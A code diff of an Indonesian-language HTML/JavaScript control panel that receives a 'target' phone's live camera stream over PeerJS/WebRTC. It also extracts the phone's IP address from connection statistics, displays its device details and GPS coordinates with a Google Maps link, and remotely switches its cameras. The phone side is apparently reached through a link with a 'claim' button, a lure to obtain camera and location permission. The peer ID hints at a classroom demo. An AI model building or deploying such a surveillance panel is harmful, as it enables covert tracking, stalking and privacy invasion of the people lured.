@@ -13,49 +13,35 @@
     #infoBox { background: #2d2d2d; margin: 15px auto; padding: 15px; border-radius: 8px; color: #00ffcc; font-family: monospace; text-align: left; line-height: 1.6; word-break: break-all; border-left: 5px solid #00ffcc; }
     .btn-maps { display: inline-block; margin-top: 10px; padding: 10px 18px; background: #28a745; color: white; border-radius: 6px; text-decoration: none; font-weight: bold; font-family: sans-serif; }
     .btn-maps:hover { background: #218838; }
-    .status-badge { display: inline-block; padding: 4px 10px; border-radius: 4px; font-size: 13px; font-weight: bold; background: #ffc107; color: #000; }
-    .status-online { background: #28a745; color: #fff; }
   </style>
 </head>
 <body>
   <div class="container">
     <h2>Layar Pantau Kamera & Data Target (Live)</h2>
-    <p>Status Receiver Laptop: <span id="peerStatus" class="status-badge">Menghubungkan Server...</span></p>
     <button id="switchBtn">🔄 Ganti Kamera (Depan / Belakang)</button> <br>
     
-    <video id="remoteVideo" autoplay playsinline muted></video>
-
-    <!-- Kotak Panel Informasi -->
     <div id="infoBox">Status: Menunggu koneksi dari HP...</div>
+
+    <video id="remoteVideo" autoplay playsinline muted></video>
   </div>
 
   <script>
     const ID_LAPTOP = "guru-demo-kamera-123";
-    let activeDataConn = null;
-    let ipTargetInfo = "Mencari IP...";
-    let deviceInfoText = "Menunggu data perangkat...";
-    let mapsButtonHtml = "<br><span style='color:#aaa;'>(Menunggu izin lokasi dari HP...)</span>";
 
     const peer = new Peer(ID_LAPTOP, {
       config: {
         iceServers: [
           { urls: 'stun:stun.l.google.com:19302' },
-          { urls: 'stun:stun1.l.google.com:19302' }
+          { urls: 'stun:stun1.l.google.com:19302' },
+          { urls: 'stun:stun2.l.google.com:19302' }
         ]
       }
     });
 
-    peer.on('open', (id) => {
-      const badge = document.getElementById('peerStatus');
-      badge.innerText = "SIAP (Online)";
-      badge.className = "status-badge status-online";
-    });
-
-    peer.on('error', (err) => {
-      if (err.type === 'unavailable-id') {
-        alert("ID Laptop sedang tertahan di server PeerJS. Silakan muat ulang (refresh) halaman laptop ini dalam 5 detik.");
-      }
-    });
+    let activeDataConn = null;
+    let ipTargetInfo = "Mencari IP...";
+    let deviceInfoText = "Menunggu data perangkat...";
+    let mapsButtonHtml = "<br><span style='color:#aaa;'>(Menunggu izin lokasi dari HP...)</span>";
 
     function updateDisplay() {
       const infoBox = document.getElementById('infoBox');
@@ -68,17 +54,16 @@
       `;
     }
 
-    // 1. Menangkap Streaming Video Kamera
+    peer.on('open', (id) => {
+      console.log('Panel Laptop Siap. ID Peer:', id);
+    });
+
     peer.on('call', (call) => {
       call.answer();
       call.on('stream', (remoteStream) => {
-        const video = document.getElementById('remoteVideo');
-        video.srcObject = remoteStream;
+        const remoteVideo = document.getElementById('remoteVideo');
+        remoteVideo.srcObject = remoteStream;
         
-        // Memastikan video langsung berputar tanpa terhalang autoplay browser
-        video.play().catch(err => console.log("Autoplay ditahan:", err));
-
-        // Ambil data statistik IP Target
         setTimeout(() => {
           if (call.peerConnection) {
             call.peerConnection.getStats().then(stats => {
@@ -94,7 +79,6 @@
       });
     });
 
-    // 2. Menangkap Data Spesifikasi & Koordinat GPS
     peer.on('connection', (conn) => {
       activeDataConn = conn;
 
@@ -112,7 +96,7 @@
         if (data.type === 'location-info') {
           mapsButtonHtml = `
             <a href="${data.mapsUrl}" target="_blank" class="btn-maps">
-              🗺️ Buka Google Maps Lokasi HP (${data.lat.toFixed(4)}, ${data.lng.toFixed(4)})
+              🗺️ Buka Google Maps Lokasi HP
             </a>
           `;
           updateDisplay();
@@ -120,12 +104,11 @@
       });
     });
 
-    // 3. Tombol Ganti Kamera
     document.getElementById('switchBtn').addEventListener('click', () => {
       if (activeDataConn && activeDataConn.open) {
         activeDataConn.send('switch');
       } else {
-        alert("HP belum terhubung! Buka link di HP dan klik tombol klaim terlebih dahulu.");
+        alert("HP belum terhubung! Pastikan link HP sudah dibuka dan tombol klaim sudah ditekan.");
       }
     });
   </script>
